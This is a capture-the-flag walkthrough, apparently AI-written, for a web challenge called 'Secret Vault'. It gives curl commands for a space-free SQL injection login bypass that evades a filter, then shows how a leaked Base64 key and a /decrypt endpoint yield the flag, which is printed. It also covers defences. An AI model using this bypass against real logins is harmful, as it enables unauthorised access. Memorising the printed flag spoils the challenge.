# Safaricom CTF — Secret Vault (Web, 300 pts)

> **Assumption:** the CHALLENGE CONTEXT block in the brief was blank, so I assumed
> the event is **Safaricom CTF (SAFCTF)**, category **Web**, difficulty **300 pts**,
> and the target is `http://54.72.82.22:8090`. All commands and outputs below were
> captured live against that service.

## 1. Challenge Overview

"Secret Vault" is a **300 pt web** challenge. It presents a login page (themed
"THE VELVET ROOM") and, once you are in, a vault of "secrets" — one of which is an
**encrypted** flag file. The goal is to get past the login, find the encryption key
the app carelessly leaves lying around, and decrypt the flag. It chains two classic
mistakes: an SQL injection in the login, and a hardcoded key shipped to the browser.

## 2. What You Need Before Starting

- **curl** — `sudo apt install curl` (Kali already has it).
- **base64** — part of coreutils, already installed.
- A browser with DevTools (**View Source** is enough here).
- No account, no VPN. **Time estimate:** 30–60 minutes.

## 3. Reconnaissance

1. Fetch the home page and confirm it is a login form:

```bash
curl -s http://54.72.82.22:8090/
```

Representative output (trimmed):

```html
<title>THE VELVET ROOM</title>
...
<form method="post" action="/login">
  <input name="username" ...>
  <input name="password" type="password" ...>
  <button>Login</button>
</form>
```

**Why this matters:** there is a `POST /login` with `username` and `password`. A login
endpoint is the first place to test for SQL injection.

2. Try a normal wrong login to see how the app responds:

```bash
curl -s -i -m 10 -X POST -d "username=admin&password=admin" http://54.72.82.22:8090/login | head -20
```

Expected output (trimmed):

```http
HTTP/1.1 200 OK
...
Invalid credentials
```

**Why this matters:** the app answers with plain text, so success and failure are easy
to tell apart — ideal for testing injection.

3. Probe a few payloads and watch the HTTP status and cookies:

```bash
for u in "admin'" "admin'--" "admin' OR '1'='1" "admin'OR'1'='1"; do
  echo "=== $u ==="
  curl -s -o /dev/null -w "%{http_code}\n" -m 10 -X POST \
    --data-urlencode "username=$u" --data-urlencode "password=x" \
    http://54.72.82.22:8090/login
done
```

Representative output:

```text
=== admin' ===
500
=== admin'-- ===
403
=== admin' OR '1'='1 ===
403
=== admin'OR'1'='1 ===
302
```

**Why this matters:** `admin'` causes a server error (a bad query = the injection
reached the database), the spaced payloads are blocked by a filter (403), but
`admin'OR'1'='1` returns a **302 redirect** — a successful login. Spaces are the thing
the filter blocks.

[SCREENSHOT: DevTools Network tab showing the 302 redirect after the no-space SQLi login]

## 4. Identifying the Vulnerability

Two problems, stacked:

1. **SQL Injection (SQLi).** The login builds its SQL query by concatenating the
   username, so `admin'OR'1'='1` changes the query's logic to "log in if any row
   matches", bypassing the password check.
2. **A hardcoded, weakly protected secret.** The vault page ships the decryption key
   to the client as a Base64 string in its JavaScript, and exposes a `/decrypt`
   endpoint that will decrypt anything if you hand it the key.

The sign that tipped me off: a `500` on a single quote (the query broke) and a `302`
on a crafted no-space payload. The filter only blocks spaces and the word `OR` spacing —
so `'OR'` glued together slips through.

**Analogy:** SQLi is glueing your words into the guard's instruction sheet. The vault
key is the same guard taping their master key to the outside of the door.

## 5. Exploitation Step by Step

1. **Log in with the no-space SQL injection.** Save the session cookie to a file:

```bash
curl -s -i -m 10 -X POST --data-urlencode "username=admin'OR'1'='1" \
  --data-urlencode "password=x" -c /tmp/ck.txt \
  http://54.72.82.22:8090/login | grep -iE "^HTTP|^Set-Cookie|^Location"
```

Expected output:

```http
HTTP/1.1 302 FOUND
Set-Cookie: session=...
Location: /vault
```

**What to look for:** a `302` and a `Location: /vault` — we are logged in.

2. **Open the vault with that cookie.**

```bash
curl -s -m 10 -b /tmp/ck.txt http://54.72.82.22:8090/vault | grep -iE "secret-name|secret-content|vaultKey"
```

Representative output (trimmed):

```html
<h3 class="secret-name">Welcome Note</h3>
<div class="secret-content">Welcome to the Secret Vault! Your secrets are safe here.</div>
<h3 class="secret-name">API Key</h3>
<div class="secret-content">sk_live_1234567890abcdef</div>
<h3 class="secret-name">FLAG.txt</h3>
<div class="secret-content">TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8TtiNnpabEvQ6D5e1evbvOphrakDhrLAIo6q4Jjw==</div>
const vaultKey = "VjR1bHRLM3kxMjM0NTY3OA==";
```

**What to look for:** the `FLAG.txt` secret is a Base64 blob, and crucially the page
leaks `const vaultKey = "VjR1bHRLM3kxMjM0NTY3OA=="`. That key is handed to the browser —
a beginner-visible mistake.

[SCREENSHOT: the vault page's secret cards and the vaultKey in View Source]

3. **Decode the leaked key.**

```bash
echo "VjR1bHRLM3kxMjM0NTY3OA==" | base64 -d; echo
```

Expected output:

```text
V4ultK3y12345678
```

**Why this matters:** the app "protected" the flag with a key it also published. Base64
is encoding, not encryption — anyone can reverse it.

4. **Ask the app to decrypt the flag using that key.**

```bash
curl -s -m 10 -b /tmp/ck.txt -H "Content-Type: application/json" -X POST \
  --data '{"data":"TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8TtiNnpabEvQ6D5e1evbvOphrakDhrLAIo6q4Jjw==","key":"V4ultK3y12345678"}' \
  http://54.72.82.22:8090/decrypt
```

Expected output:

```json
{"decrypted":"safctf{7877e854c9f06a8362af26ee280a6574}","success":true}
```

**What to look for:** the `decrypted` field holds the flag.

### Optional Burp Suite walkthrough

1. Turn **Proxy → Intercept is on** and submit the login form.
2. Right-click the `POST /login` request → **Send to Repeater**.
3. Change the body to `username=admin%27OR%271%27%3D%271&password=x` and click **Send**.
   Watch the response for the `302` and the `Set-Cookie`.
4. In the browser, load `/vault`, view the page source, and copy the `vaultKey` and the
   `FLAG.txt` ciphertext.
5. Send a new Repeater request: `POST /decrypt`, header `Content-Type: application/json`,
   body `{"data":"<ciphertext>","key":"V4ultK3y12345678"}`.

## 6. Capturing the Flag

Two ways to get the same value:

- Decode from the `/decrypt` response:
  ```
  safctf{7877e854c9f06a8362af26ee280a6574}
  ```
- Or read it in the vault after it is revealed in the browser.

## 7. Why This Works (Beginner Explanation)

The login is vulnerable because the SQL query is assembled by gluing the username into
it. In SQL, the apostrophe `'` closes the string the developer opened, and the
`OR '1'='1'` makes the `WHERE` clause true for every row, so the password check becomes
irrelevant.

The second bug is about **where a secret lives**. Encryption only helps if the key stays
secret. Here the key was (a) hardcoded in the app and (b) serialized into the page as
Base64. Base64 is a reversible encoding — it hides nothing. Anyone who opens DevTools
gets the key, and the `/decrypt` endpoint happily decodes the flag.

In the real world, hardcoded keys in client-side code are a recurring cause of leaks:
mobile apps, JavaScript bundles, and firmware routinely ship API keys and passwords.

## 8. Common Mistakes and Dead Ends

- **Using spaces in the payload.** `admin' OR '1'='1` and `admin'--` return **403** on
  this box; the filter blocks spaces. Removing them (`admin'OR'1'='1`) bypasses it.
- **Ignoring the cookie jar.** You must capture the session cookie (`-c /tmp/ck.txt`)
  and send it back (`-b /tmp/ck.txt`) to reach `/vault`.
- **Treating the Base64 key as encrypted.** Do not try to "crack" it; just `base64 -d`.
- **Assuming the ciphertext is the flag.** The Base64 blob is ciphertext. It only
  becomes the flag after the `/decrypt` call.

## 9. How to Defend Against This

- Use **parameterised queries / prepared statements** for the login so `'` cannot
  change the query.
- **Never ship encryption keys to the client.** Keep them server-side; use an API that
  decrypts on the server without handing out the key.
- Do not treat **Base64 as protection** — it is encoding. Use real encryption with
  proper key management (KMS/HSM) if data must be stored.
- Return **generic login errors** and avoid leaking whether a username exists.
- Store secrets in a **secrets manager**, not in source code or JavaScript bundles.

## 10. Key Takeaways

- A login that breaks on `'` is an SQLi candidate; try the no-space form when a WAF is present.
- Base64 is **not** encryption. `echo '<blob>' | base64 -d` is the whole attack on the key.
- Chain bugs: SQLi to get in, then a leaked key + `/decrypt` to finish.
- Cheatsheet:
  `curl -s -X POST --data-urlencode "username=admin'OR'1'='1" --data-urlencode "password=x" -c /tmp/ck.txt http://TARGET/login`
- **Flag:** `safctf{7877e854c9f06a8362af26ee280a6574}`

You just chained two "small" mistakes into a full compromise — that is exactly how real
breaches happen.
